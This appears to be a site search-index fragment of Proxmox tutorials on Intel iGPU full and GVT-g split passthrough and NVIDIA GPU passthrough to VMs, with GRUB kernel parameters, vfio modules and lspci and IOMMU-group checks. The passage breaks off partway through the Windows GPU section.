"infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/", "tags": ["proxmox", "igpu", "passthrough"], "text": "iGPU Passthrough to VM (Intel Integrated Graphics) \u00b6 Introduction \u00b6 Intel Integrated Graphics (iGPU) is a GPU that is integrated into the CPU. The GPU is a part of the CPU and is used to render graphics. Proxmox may be configured to use iGPU passthrough to VM to allow the VM to use the iGPU for hardware acceleration for example using video encoding/decoding and Transcoding for series like Plex and Emby. This guide will show you how to configure Proxmox to use iGPU passthrough to VM. Your mileage may vary depending on your hardware. The following guide was tested with Intel Gen8 CPU. There are two ways to use iGPU passthrough to VM. The first way is to use the Full iGPU Passthrough to VM. The second way is to use the iGPU GVT-g technology which allows as to split the iGPU into two parts. We will be covering the Full iGPU Passthrough . If you want to use the split iGPU GVT-g Passthrough you can find the guide here . Proxmox Configuration for iGPU Full Passthrough \u00b6 The following examples uses SSH connection to the Proxmox server. The editor is nano but feel free to use any other editor. We will be editing the grub configuration file. Edit the grub configuration file. nano /etc/default/grub Find the line that starts with GRUB_CMDLINE_LINUX_DEFAULT by default they should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" We want to allow passthrough and Blacklists known graphics drivers to prevent proxmox from utilizing the iGPU. Warning You will loose the ability to use the onboard graphics card to access the Proxmox's console since Proxmox won't be able to use the Intel's gpu Your GRUB_CMDLINE_LINUX_DEFAULT should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on iommu=pt pcie_acs_override=downstream,multifunction initcall_blacklist=sysfb_init video=simplefb:off video=vesafb:off video=efifb:off video=vesa:off disable_vga=1 vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu,snd_hda_intel,snd_hda_codec_hdmi,i915\" Note This will blacklist most of the graphics drivers from proxmox. If you have a specific driver you need to use for Proxmox Host you need to remove it from modprobe.blacklist Save and exit the editor. Update the grub configuration to apply the changes the next time the system boots. update-grub Next we need to add vfio modules to allow PCI passthrough. Edit the /etc/modules file. nano /etc/modules Add the following line to the end of the file: # Modules required for PCI passthrough vfio vfio_iommu_type1 vfio_pci vfio_virqfd Update configuration changes made in your /etc filesystem update-initramfs -u -k all Save and exit the editor. Reboot Proxmox to apply the changes Verify that IOMMU is enabled dmesg | grep -e DMAR -e IOMMU There should be a line that looks like DMAR: IOMMU enabled . If there is no output, something is wrong. [ 0 .000000 ] Warning: PCIe ACS overrides enabled ; This may allow non-IOMMU protected peer-to-peer DMA [ 0 .067203 ] DMAR: IOMMU enabled [ 2 .573920 ] pci 0000 :00:00.2: AMD-Vi: IOMMU performance counters supported [ 2 .580393 ] pci 0000 :00:00.2: AMD-Vi: Found IOMMU cap 0x40 [ 2 .581776 ] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank). Windows Virtual Machine iGPU Passthrough Configuration \u00b6 For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox . Find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Select All Functions , ROM-Bar , PCI-Express and then click Add . Tip I've found that the most consistent way to utilize the GPU acceleration is to disable Proxmox's Virtual Graphics card of the vm. The drawback of disabling the Virtual Graphics card is that it will not be able to access the vm via proxmox's vnc console. The workaround is to enable Remote Desktop (RDP) on the VM before disabling the Virtual Graphics card and accessing the VM via RDP or use any other remove desktop client. If you loose the ability to access the VM via RDP you can temporarily remove the GPU PCI Device and re-enable the virtual graphics card The Windows Virtual Machine Proxmox Setting should look like this: Power on the Windows Virtual Machine. Connect to the VM via Remote Desktop (RDP) or any other remote access protocol you prefer. Install the latest version of Intel's Graphics Driver or use the Intel Driver & Support Assistant installer. If all when well you should see the following output in Device Manager and GPU-Z : That's it! Linux Virtual Machine iGPU Passthrough Configuration \u00b6 We will be using Ubuntu Server 20.04 LTS. for this guide. From Proxmox Terminal find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Select All Functions , ROM-Bar and then click Add . The Ubuntu Virtual Machine Proxmox Setting should look like this: Boot the VM. To test the iGPU passthrough was successful, you can use the following command: sudo lspci -nnv | grep VGA The output should incliude the Intel iGPU: 00 :10.0 VGA compatible controller [ 0300 ] : Intel Corporation UHD Graphics 630 ( Desktop ) [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) Now we need to check if the GPU's Driver initalization is working. cd /dev/dri && ls -la The output should incliude the renderD128 That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen. Debug \u00b6 Dbug Messages - Shows Hardware initialization and errors dmesg -w Display PCI devices information lspci Display Driver in use for PCI devices lspci -k Display IOMMU Groups the PCI devices are assigned to #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ;", "title": "iGPU Passthrough to VM"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#igpu-passthrough-to-vm-intel-integrated-graphics", "text": "", "title": "iGPU Passthrough to VM (Intel Integrated Graphics)"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#introduction", "text": "Intel Integrated Graphics (iGPU) is a GPU that is integrated into the CPU. The GPU is a part of the CPU and is used to render graphics. Proxmox may be configured to use iGPU passthrough to VM to allow the VM to use the iGPU for hardware acceleration for example using video encoding/decoding and Transcoding for series like Plex and Emby. This guide will show you how to configure Proxmox to use iGPU passthrough to VM. Your mileage may vary depending on your hardware. The following guide was tested with Intel Gen8 CPU. There are two ways to use iGPU passthrough to VM. The first way is to use the Full iGPU Passthrough to VM. The second way is to use the iGPU GVT-g technology which allows as to split the iGPU into two parts. We will be covering the Full iGPU Passthrough . If you want to use the split iGPU GVT-g Passthrough you can find the guide here .", "title": "Introduction"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#proxmox-configuration-for-igpu-full-passthrough", "text": "The following examples uses SSH connection to the Proxmox server. The editor is nano but feel free to use any other editor. We will be editing the grub configuration file. Edit the grub configuration file. nano /etc/default/grub Find the line that starts with GRUB_CMDLINE_LINUX_DEFAULT by default they should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" We want to allow passthrough and Blacklists known graphics drivers to prevent proxmox from utilizing the iGPU. Warning You will loose the ability to use the onboard graphics card to access the Proxmox's console since Proxmox won't be able to use the Intel's gpu Your GRUB_CMDLINE_LINUX_DEFAULT should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on iommu=pt pcie_acs_override=downstream,multifunction initcall_blacklist=sysfb_init video=simplefb:off video=vesafb:off video=efifb:off video=vesa:off disable_vga=1 vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu,snd_hda_intel,snd_hda_codec_hdmi,i915\" Note This will blacklist most of the graphics drivers from proxmox. If you have a specific driver you need to use for Proxmox Host you need to remove it from modprobe.blacklist Save and exit the editor. Update the grub configuration to apply the changes the next time the system boots. update-grub Next we need to add vfio modules to allow PCI passthrough. Edit the /etc/modules file. nano /etc/modules Add the following line to the end of the file: # Modules required for PCI passthrough vfio vfio_iommu_type1 vfio_pci vfio_virqfd Update configuration changes made in your /etc filesystem update-initramfs -u -k all Save and exit the editor. Reboot Proxmox to apply the changes Verify that IOMMU is enabled dmesg | grep -e DMAR -e IOMMU There should be a line that looks like DMAR: IOMMU enabled . If there is no output, something is wrong. [ 0 .000000 ] Warning: PCIe ACS overrides enabled ; This may allow non-IOMMU protected peer-to-peer DMA [ 0 .067203 ] DMAR: IOMMU enabled [ 2 .573920 ] pci 0000 :00:00.2: AMD-Vi: IOMMU performance counters supported [ 2 .580393 ] pci 0000 :00:00.2: AMD-Vi: Found IOMMU cap 0x40 [ 2 .581776 ] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).", "title": "Proxmox Configuration for iGPU Full Passthrough"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#windows-virtual-machine-igpu-passthrough-configuration", "text": "For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox . Find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Select All Functions , ROM-Bar , PCI-Express and then click Add . Tip I've found that the most consistent way to utilize the GPU acceleration is to disable Proxmox's Virtual Graphics card of the vm. The drawback of disabling the Virtual Graphics card is that it will not be able to access the vm via proxmox's vnc console. The workaround is to enable Remote Desktop (RDP) on the VM before disabling the Virtual Graphics card and accessing the VM via RDP or use any other remove desktop client. If you loose the ability to access the VM via RDP you can temporarily remove the GPU PCI Device and re-enable the virtual graphics card The Windows Virtual Machine Proxmox Setting should look like this: Power on the Windows Virtual Machine. Connect to the VM via Remote Desktop (RDP) or any other remote access protocol you prefer. Install the latest version of Intel's Graphics Driver or use the Intel Driver & Support Assistant installer. If all when well you should see the following output in Device Manager and GPU-Z : That's it!", "title": "Windows Virtual Machine iGPU Passthrough Configuration"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#linux-virtual-machine-igpu-passthrough-configuration", "text": "We will be using Ubuntu Server 20.04 LTS. for this guide. From Proxmox Terminal find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Select All Functions , ROM-Bar and then click Add . The Ubuntu Virtual Machine Proxmox Setting should look like this: Boot the VM. To test the iGPU passthrough was successful, you can use the following command: sudo lspci -nnv | grep VGA The output should incliude the Intel iGPU: 00 :10.0 VGA compatible controller [ 0300 ] : Intel Corporation UHD Graphics 630 ( Desktop ) [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) Now we need to check if the GPU's Driver initalization is working. cd /dev/dri && ls -la The output should incliude the renderD128 That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen.", "title": "Linux Virtual Machine iGPU Passthrough Configuration"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-passthrough-to-vm/#debug", "text": "Dbug Messages - Shows Hardware initialization and errors dmesg -w Display PCI devices information lspci Display Driver in use for PCI devices lspci -k Display IOMMU Groups the PCI devices are assigned to #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ;", "title": "Debug"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/", "tags": ["proxmox", "igpu", "passthrough"], "text": "iGPU Split Passthrough (Intel Integrated Graphics) \u00b6 Introduction \u00b6 Intel Integrated Graphics (iGPU) is a GPU that is integrated into the CPU. The GPU is a part of the CPU and is used to render graphics. Proxmox may be configured to use iGPU split passthrough to VM to allow the VM to use the iGPU for hardware acceleration for example using video encoding/decoding and Transcoding for series like Plex and Emby. This guide will show you how to configure Proxmox to use iGPU passthrough to VM. Your mileage may vary depending on your hardware. The following guide was tested with Intel Gen8 CPU. Supported CPUs iGPU GVT-g Split Passthrough is supported only on Intel's 5 th generation to 10 th generation CPUs! Known supported CPUs familys: Broadwell Skylake Kaby Lake Coffee Lake Comet Lake There are two ways to use iGPU passthrough to VM. The first way is to use the Full iGPU Passthrough to VM. The second way is to use the iGPU GVT-g technology which allows as to split the iGPU into two parts. We will be covering the Split iGPU Passthrough . If you want to use the split Full iGPU Passthrough you can find the guide here . Proxmox Configuration for GVT-g Split Passthrough \u00b6 The following examples uses SSH connection to the Proxmox server. The editor is nano but feel free to use any other editor. We will be editing the grub configuration file. Edit the grub configuration file. nano /etc/default/grub Find the line that starts with GRUB_CMDLINE_LINUX_DEFAULT by default they should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" We want to allow passthrough and Blacklists known graphics drivers to prevent proxmox from utilizing the iGPU. Your GRUB_CMDLINE_LINUX_DEFAULT should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on i915.enable_gvt=1 iommu=pt pcie_acs_override=downstream,multifunction video=efifb:off video=vesa:off vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu\" Note This will blacklist most of the graphics drivers from proxmox. If you have a specific driver you need to use for Proxmox Host you need to remove it from modprobe.blacklist Save and exit the editor. Update the grub configuration to apply the changes the next time the system boots. update-grub Next we need to add vfio modules to allow PCI passthrough. Edit the /etc/modules file. nano /etc/modules Add the following line to the end of the file: # Modules required for PCI passthrough vfio vfio_iommu_type1 vfio_pci vfio_virqfd # Modules required for Intel GVT-g Split kvmgt Save and exit the editor. Update configuration changes made in your /etc filesystem update-initramfs -u -k all Reboot Proxmox to apply the changes Verify that IOMMU is enabled dmesg | grep -e DMAR -e IOMMU There should be a line that looks like DMAR: IOMMU enabled . If there is no output, something is wrong. [ 0 .000000 ] Warning: PCIe ACS overrides enabled ; This may allow non-IOMMU protected peer-to-peer DMA [ 0 .067203 ] DMAR: IOMMU enabled [ 2 .573920 ] pci 0000 :00:00.2: AMD-Vi: IOMMU performance counters supported [ 2 .580393 ] pci 0000 :00:00.2: AMD-Vi: Found IOMMU cap 0x40 [ 2 .581776 ] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank). Windows Virtual Machine iGPU Passthrough Configuration \u00b6 For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox . Find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Click Mdev Type , You should be presented with a list of the available split passthrough devices choose the better performing one for the vm. Select ROM-Bar , PCI-Express and then click Add . The Windows Virtual Machine Proxmox Setting should look like this: Power on the Windows Virtual Machine. Open the VM's Console. Install the latest version of Intel's Graphics Driver or use the Intel Driver & Support Assistant installer. If all when well you should see the following output in Device Manager and GPU-Z : That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen. Linux Virtual Machine iGPU Passthrough Configuration \u00b6 We will be using Ubuntu Server 20.04 LTS for this guide. From Proxmox Terminal find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . VM should be configured the Machine type to i440fx . Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU to. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Click Mdev Type , You should be presented with a list of the available split passthrough devices choose the better performing one for the vm. Select ROM-Bar , and then click Add . The Ubuntu Virtual Machine Proxmox Setting should look like this: Boot the VM. To test the iGPU passthrough was successful, you can use the following command: sudo lspci -nnv | grep VGA The output should incliude the Intel iGPU: 00 :10.0 VGA compatible controller [ 0300 ] : Intel Corporation UHD Graphics 630 ( Desktop ) [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) Now we need to check if the GPU's Driver initalization is working. cd /dev/dri && ls -la The output should incliude the renderD128 That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen. Debug \u00b6 Dbug Messages - Shows Hardware initialization and errors dmesg -w Display PCI devices information lspci Display Driver in use for PCI devices lspci -k Display IOMMU Groups the PCI devices are assigned to #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ;", "title": "iGPU Split Passthrough"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#igpu-split-passthrough-intel-integrated-graphics", "text": "", "title": "iGPU Split Passthrough (Intel Integrated Graphics)"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#introduction", "text": "Intel Integrated Graphics (iGPU) is a GPU that is integrated into the CPU. The GPU is a part of the CPU and is used to render graphics. Proxmox may be configured to use iGPU split passthrough to VM to allow the VM to use the iGPU for hardware acceleration for example using video encoding/decoding and Transcoding for series like Plex and Emby. This guide will show you how to configure Proxmox to use iGPU passthrough to VM. Your mileage may vary depending on your hardware. The following guide was tested with Intel Gen8 CPU. Supported CPUs iGPU GVT-g Split Passthrough is supported only on Intel's 5 th generation to 10 th generation CPUs! Known supported CPUs familys: Broadwell Skylake Kaby Lake Coffee Lake Comet Lake There are two ways to use iGPU passthrough to VM. The first way is to use the Full iGPU Passthrough to VM. The second way is to use the iGPU GVT-g technology which allows as to split the iGPU into two parts. We will be covering the Split iGPU Passthrough . If you want to use the split Full iGPU Passthrough you can find the guide here .", "title": "Introduction"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#proxmox-configuration-for-gvt-g-split-passthrough", "text": "The following examples uses SSH connection to the Proxmox server. The editor is nano but feel free to use any other editor. We will be editing the grub configuration file. Edit the grub configuration file. nano /etc/default/grub Find the line that starts with GRUB_CMDLINE_LINUX_DEFAULT by default they should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" We want to allow passthrough and Blacklists known graphics drivers to prevent proxmox from utilizing the iGPU. Your GRUB_CMDLINE_LINUX_DEFAULT should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on i915.enable_gvt=1 iommu=pt pcie_acs_override=downstream,multifunction video=efifb:off video=vesa:off vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu\" Note This will blacklist most of the graphics drivers from proxmox. If you have a specific driver you need to use for Proxmox Host you need to remove it from modprobe.blacklist Save and exit the editor. Update the grub configuration to apply the changes the next time the system boots. update-grub Next we need to add vfio modules to allow PCI passthrough. Edit the /etc/modules file. nano /etc/modules Add the following line to the end of the file: # Modules required for PCI passthrough vfio vfio_iommu_type1 vfio_pci vfio_virqfd # Modules required for Intel GVT-g Split kvmgt Save and exit the editor. Update configuration changes made in your /etc filesystem update-initramfs -u -k all Reboot Proxmox to apply the changes Verify that IOMMU is enabled dmesg | grep -e DMAR -e IOMMU There should be a line that looks like DMAR: IOMMU enabled . If there is no output, something is wrong. [ 0 .000000 ] Warning: PCIe ACS overrides enabled ; This may allow non-IOMMU protected peer-to-peer DMA [ 0 .067203 ] DMAR: IOMMU enabled [ 2 .573920 ] pci 0000 :00:00.2: AMD-Vi: IOMMU performance counters supported [ 2 .580393 ] pci 0000 :00:00.2: AMD-Vi: Found IOMMU cap 0x40 [ 2 .581776 ] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).", "title": "Proxmox Configuration for GVT-g Split Passthrough"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#windows-virtual-machine-igpu-passthrough-configuration", "text": "For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox . Find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Click Mdev Type , You should be presented with a list of the available split passthrough devices choose the better performing one for the vm. Select ROM-Bar , PCI-Express and then click Add . The Windows Virtual Machine Proxmox Setting should look like this: Power on the Windows Virtual Machine. Open the VM's Console. Install the latest version of Intel's Graphics Driver or use the Intel Driver & Support Assistant installer. If all when well you should see the following output in Device Manager and GPU-Z : That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen.", "title": "Windows Virtual Machine iGPU Passthrough Configuration"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#linux-virtual-machine-igpu-passthrough-configuration", "text": "We will be using Ubuntu Server 20.04 LTS for this guide. From Proxmox Terminal find the PCI address of the iGPU. lspci -nnv | grep VGA This should result in output similar to this: 00 :02.0 VGA compatible controller [ 0300 ] : Intel Corporation CometLake-S GT2 [ UHD Graphics 630 ] [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the iGPU is 00:02.0 . VM should be configured the Machine type to i440fx . Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU to. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 00:02.0 is listed as 0000:00:02.0 . Click Mdev Type , You should be presented with a list of the available split passthrough devices choose the better performing one for the vm. Select ROM-Bar , and then click Add . The Ubuntu Virtual Machine Proxmox Setting should look like this: Boot the VM. To test the iGPU passthrough was successful, you can use the following command: sudo lspci -nnv | grep VGA The output should incliude the Intel iGPU: 00 :10.0 VGA compatible controller [ 0300 ] : Intel Corporation UHD Graphics 630 ( Desktop ) [ 8086 :3e92 ] ( prog-if 00 [ VGA controller ]) Now we need to check if the GPU's Driver initalization is working. cd /dev/dri && ls -la The output should incliude the renderD128 That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen.", "title": "Linux Virtual Machine iGPU Passthrough Configuration"}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#debug", "text": "Dbug Messages - Shows Hardware initialization and errors dmesg -w Display PCI devices information lspci Display Driver in use for PCI devices lspci -k Display IOMMU Groups the PCI devices are assigned to #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ;", "title": "Debug"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/", "tags": ["template", "markdown"], "text": "Proxmox GPU Passthrough to VM \u00b6 Introduction \u00b6 GPU passthrough is a technology that allows the Linux kernel to present the internal PCI GPU directly to the virtual machine. The device behaves as if it were powered directly by the virtual machine, and the virtual machine detects the PCI device as if it were physically connected. We will cover how to enable GPU passthrough to a virtual machine in Proxmox VE. Your mileage may vary depending on your hardware. Proxmox Configuration for GPU Passthrough \u00b6 The following examples uses SSH connection to the Proxmox server. The editor is nano but feel free to use any other editor. We will be editing the grub configuration file. Find the PCI address of the GPU Device. The following command will show the PCI address of the GPU devices in Proxmox server: lspci -nnv | grep VGA Find the GPU you want to passthrough in result ts should be similar to this: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) What we are looking is the PCI address of the GPU device. In this case it's 01:00.0 . 01:00.0 is only a part of of a group of PCI devices on the GPU. We can list all the devices in the group 01:00 by using the following command: lspci -s 01 :00 The usual output will include VGA Device and Audio Device. In my case, we have a USB Controller and a Serial bus controller: 01 :00.0 VGA compatible controller: NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] ( rev a1 ) 01 :00.1 Audio device: NVIDIA Corporation TU104 HD Audio Controller ( rev a1 ) 01 :00.2 USB controller: NVIDIA Corporation TU104 USB 3 .1 Host Controller ( rev a1 ) 01 :00.3 Serial bus controller [ 0c80 ] : NVIDIA Corporation TU104 USB Type-C UCSI Controller ( rev a1 ) Now we need to get the id's of those devices. We can do this by using the following command: lspci -s 01 :00 -n The output should look similar to this: 01 :00.0 0300 : 10de:1e81 ( rev a1 ) 01 :00.1 0403 : 10de:10f8 ( rev a1 ) 01 :00.2 0c03: 10de:1ad8 ( rev a1 ) 01 :00.3 0c80: 10de:1ad9 ( rev a1 ) What we are looking are the pairs, we will use those id to split the PCI Group to separate devices. 10de:1e81,10de:10f8,10de:1ad8,10de:1ad9 Now it's time to edit the grub configuration file. nano /etc/default/grub Find the line that starts with GRUB_CMDLINE_LINUX_DEFAULT by default they should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" For Intel CPU For AMD CPU intel_iommu = on amd_iommu = on Then change it to look like this (Intel CPU example) and replace vfio-pci.ids= with the ids for the GPU you want to passthrough: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on pcie_acs_override=downstream,multifunction video=efifb:off video=vesa:off vfio-pci.ids=10de:1e81,10de:10f8,10de:1ad8,10de:1ad9 vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu\" Save the config changed and then update GRUB. update-grub Next we need to add vfio modules to allow PCI passthrough. Edit the /etc/modules file. nano /etc/modules Add the following line to the end of the file: # Modules required for PCI passthrough vfio vfio_iommu_type1 vfio_pci vfio_virqfd Save and exit the editor. Update configuration changes made in your /etc filesystem update-initramfs -u -k all Reboot Proxmox to apply the changes Verify that IOMMU is enabled dmesg | grep -e DMAR -e IOMMU There should be a line that looks like DMAR: IOMMU enabled . If there is no output, something is wrong. [ 0 .000000 ] Warning: PCIe ACS overrides enabled ; This may allow non-IOMMU protected peer-to-peer DMA [ 0 .067203 ] DMAR: IOMMU enabled [ 2 .573920 ] pci 0000 :00:00.2: AMD-Vi: IOMMU performance counters supported [ 2 .580393 ] pci 0000 :00:00.2: AMD-Vi: Found IOMMU cap 0x40 [ 2 .581776 ] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank). Check that the GPU is in a separate IOMMU Group by using the following command: #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ; Now your Proxmox host should be ready to GPU passthrough! Windows Virtual Machine GPU Passthrough Configuration \u00b6 For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox . Limitations & Workarounds In order for the GPU to to function properly in the VM, you must disable Proxmox's Virutal Display - Set it none . You will lose the ability to conect to the VM via Proxmox's Console. Display must be conected to the physical output of the GPU for the Windows Host to initialize the GPU properly. You can use a HDMI Dummy Plug as a workaround - It will present itself as a HDMI Display to the Windows Host. Make sure you have alternative way to connect to the VM for example via Remote Desktop (RDP). Find the PCI address of the GPU. lspci -nnv | grep VGA This should result in output similar to this: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 